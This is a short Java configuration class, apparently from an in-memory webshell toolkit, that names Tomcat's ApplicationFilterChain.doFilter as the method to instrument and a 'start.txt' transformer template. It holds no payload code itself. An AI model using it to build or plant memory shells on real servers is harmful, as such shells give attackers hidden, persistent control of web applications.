package org.apache.spring;


public class c {

    public static class SpringMemShellConfig {
        public static final String TransformedClassName = "org.apache.catalina.core.ApplicationFilterChain";
        public static final String TransformedMethodName = "doFilter";
    }

    public static class SpringMemTransformerConfig {
        public static final String TransformedClassName = SpringMemShellConfig.TransformedClassName;
        public static final String TransformedEqualName = SpringMemShellConfig.TransformedClassName.replace(".", "/");
        public static final String TransformedMethodName = SpringMemShellConfig.TransformedMethodName;
    }

    public static class TemplatesConfig {
        public static final String StartTransformer = "start.txt";
    }



}
